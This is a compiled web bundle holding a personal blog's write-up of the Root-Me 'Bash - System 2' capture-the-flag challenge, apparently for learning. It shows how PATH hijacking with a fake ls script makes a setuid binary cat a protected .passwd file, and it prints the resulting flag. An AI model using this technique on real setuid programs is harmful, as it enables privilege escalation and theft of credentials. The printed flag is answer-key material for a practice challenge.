"use strict";(self.webpackChunkmy_own_blog=self.webpackChunkmy_own_blog||[]).push([[5642],{3885:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>o,contentTitle:()=>c,default:()=>d,frontMatter:()=>l,metadata:()=>t,toc:()=>a});const t=JSON.parse('{"id":"root-me/app-script/bash-system-2","title":"Bash - System 2","description":"- Description: Simple script","source":"@site/docs/root-me/app-script/bash-system-2.mdx","sourceDirName":"root-me/app-script","slug":"/root-me/app-script/bash-system-2","permalink":"/my-small-blog/docs/root-me/app-script/bash-system-2","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"tags":[]},"sidebar":"tutorialSidebar","previous":{"title":"Bash - System 1","permalink":"/my-small-blog/docs/root-me/app-script/bash-system-1"},"next":{"title":"Forensic","permalink":"/my-small-blog/docs/category/forensic"}}');var r=n(4848),i=n(8453);const l={tags:[]},c="Bash - System 2",o={},a=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function h(e){const s={blockquote:"blockquote",code:"code",em:"em",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.header,{children:(0,r.jsx)(s.h1,{id:"bash---system-2",children:"Bash - System 2"})}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Description:"})," Simple script"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.strong,{children:"Difficulty:"})," Very easy"]}),"\n"]}),"\n",(0,r.jsx)(s.hr,{}),"\n",(0,r.jsx)(s.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,r.jsxs)(s.p,{children:["This challenge is quite similar to the ",(0,r.jsx)(s.strong,{children:"Bash - System 1"})," challenge, although the exploitation method here is slightly more involved."]}),"\n",(0,r.jsxs)(s.p,{children:["When the user executes the ",(0,r.jsx)(s.code,{children:"ch12"})," binary, it internally runs ",(0,r.jsx)(s.code,{children:"ls -lA ..."}),"."]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:'int main(){\r\n    setreuid(geteuid(), geteuid());\r\n    system("ls -lA /challenge/app-script/ch12/.passwd");\r\n    return 0;\r\n}\n'})}),"\n",(0,r.jsxs)(s.p,{children:["Our goal is to access the contents of the ",(0,r.jsx)(s.code,{children:".passwd"})," file.\r\nTo achieve that, we can take advantage of how the ",(0,r.jsx)(s.code,{children:"system()"})," function relies on the environment's ",(0,r.jsx)(s.strong,{children:"$PATH"})," variable to locate binaries like ",(0,r.jsx)(s.code,{children:"ls"}),"."]}),"\n",(0,r.jsxs)(s.p,{children:["We'll approach this by creating ",(0,r.jsx)(s.em,{children:"a fake ls"})," script that actually runs cat, then modify $PATH so that the program executes our version instead of the real ",(0,r.jsx)(s.code,{children:"/bin/ls"}),"."]}),"\n",(0,r.jsxs)(s.ol,{children:["\n",(0,r.jsx)(s.li,{children:"Create a fake ls script:"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"echo '#!/bin/sh' > /tmp/mybin/ls\r\necho 'cat /challenge/app-script/ch12/.passwd' >> /tmp/mybin/ls\r\nchmod +x /tmp/mybin/ls\n"})}),"\n",(0,r.jsxs)(s.p,{children:["This script mimics ",(0,r.jsx)(s.code,{children:"ls"}),", but instead prints the contents of the target file."]}),"\n",(0,r.jsxs)(s.ol,{start:"2",children:["\n",(0,r.jsx)(s.li,{children:"Execute the binary with the modified $PATH:"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"app-script-ch12@challenge02:~$ PATH=/tmp/mybin:$PATH ./ch12\r\n8a95eDS/*e_T#\n"})}),"\n",(0,r.jsx)(s.p,{children:"And just like that, the program runs our fake ls, revealing the flag."}),"\n",(0,r.jsx)(s.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,r.jsxs)(s.blockquote,{children:["\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.code,{children:"8a95eDS/*e_T#"})}),"\n"]})]})}function d(e={}){const{wrapper:s}={...(0,i.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>l,x:()=>c});var t=n(6540);const r={},i=t.createContext(r);function l(e){const s=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:l(e.components),t.createElement(i.Provider,{value:s},e.children)}}}]);